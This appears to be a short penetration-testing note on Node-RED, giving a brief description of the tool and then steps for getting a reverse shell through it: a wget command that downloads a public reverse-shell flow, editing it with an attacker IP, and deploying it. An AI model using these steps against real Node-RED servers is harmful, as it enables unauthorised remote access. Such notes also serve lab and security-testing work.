**Node-RED** is a [flow-based](https://en.wikipedia.org/wiki/Flow-based_programming "Flow-based programming"), [low-code](https://en.wikipedia.org/wiki/Low-code_development_platform "Low-code development platform") development tool for [visual programming](https://en.wikipedia.org/wiki/Visual_programming_language "Visual programming language") developed originally by [IBM](https://en.wikipedia.org/wiki/IBM "IBM") for wiring together hardware devices, [APIs](https://en.wikipedia.org/wiki/Application_programming_interface "Application programming interface") and [online services](https://en.wikipedia.org/wiki/Online_services "Online services") as part of the [Internet of things](https://en.wikipedia.org/wiki/Internet_of_things "Internet of things").[[3]](https://en.wikipedia.org/wiki/Node-RED#cite_note-3)

Node-RED provides a [web browser](https://en.wikipedia.org/wiki/Web_browser "Web browser")-based flow editor, which can be used to create [JavaScript](https://en.wikipedia.org/wiki/JavaScript "JavaScript") functions. Elements of applications can be saved or shared for re-use. The runtime is built on [Node.js](https://en.wikipedia.org/wiki/Node.js "Node.js"). The flows created in Node-RED are stored using [JSON](https://en.wikipedia.org/wiki/JSON "JSON"). Since version 0.14, [MQTT](https://en.wikipedia.org/wiki/MQTT "MQTT") nodes can make properly configured [TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security "Transport Layer Security") connections.

# Generating a Reverse Shell
We can stablish reverse connection by using this tool.
````
wget https://raw.githubusercontent.com/valkyrix/Node-Red-Reverse-Shell/master/node-red-reverse-shell.json
````

We need to change the host and port with our attacker IP
![[Pasted image 20240406120025.png]]
![[Pasted image 20240406120223.png]]

We can copy all this json modified directly in the tool

![[Pasted image 20240406120433.png]]
![[Pasted image 20240406120515.png]]![[Pasted image 20240406120601.png]]

Deploy and I should get a console
![[Pasted image 20240406120723.png]]
